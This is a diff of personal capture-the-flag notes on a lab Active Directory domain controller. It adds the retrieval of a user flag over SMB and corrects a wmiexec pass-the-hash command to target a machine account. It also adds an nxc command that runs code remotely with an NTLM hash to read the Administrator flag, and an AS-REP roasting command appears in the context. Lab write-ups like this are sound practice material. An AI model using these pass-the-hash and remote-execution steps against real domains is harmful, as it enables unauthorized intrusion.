@@ -213,6 +213,13 @@ LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
 
 ntuser.ini in the ytbob317 reads as \ufffd\ufffd
 
+smb: \ybob317\Desktop\> get user.txt
+getting file \ybob317\Desktop\user.txt of size 33 as user.txt (2.7 KiloBytes/sec) (average 2.7 KiloBytes/sec)
+smb: \ybob317\Desktop\> ^C
+root@ip-10-201-118-50:~# cat user.txt
+28189316c25dd3c0ad56d44d000d62a8
+
+
 NOTE: Here I could install smbmap on the attack box and view recursively but I have more options until I have to dive down the rabbit hole of fully mapping the shares.
 
 root@ip-10-201-48-39:~# GetNPUsers.py SOUPEDECODE.LOCAL/ -dc-ip 10.201.9.75 -usersfile users.txt -format hashcat -outputfile hashes.txt
@@ -321,10 +328,19 @@ SMB         10.201.9.75     445    DC01             [+] SOUPEDECODE.LOCAL\FileSe
 
 I chopped some of the output but, moral of the story is don't go spamming random hashes
 
-root@ip-10-201-118-50:/opt/impacket/examples# python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559 FileServer@10.201.9.75
+root@ip-10-201-118-50:/opt/impacket/examples# python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559 FileServer$@10.201.9.75
 Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 
 [*] SMBv3.0 dialect used
 [-] Unknown DCE RPC fault status code:
 
 darn, oh wait I have a password
+
+root@ip-10-201-118-50:/opt/impacket/examples# nxc smb 10.201.9.75 -u 'FileServer$' -H e41da7e79a4c76dbd9cf79d1cb325559 -x 'type C:\\Users\\Administrator\\Desktop\\root.txt'
+SMB         10.201.9.75     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.9.75     445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+SMB         10.201.9.75     445    DC01             [+] Executed command via wmiexec
+SMB         10.201.9.75     445    DC01             27cb2be302c388d63d27c86bfdd5f56a
+
+super odd i cant get wmiexec to work but can via crackmapexec.... had to lookup this solution. Noted escaping the backslashes obviously.
+
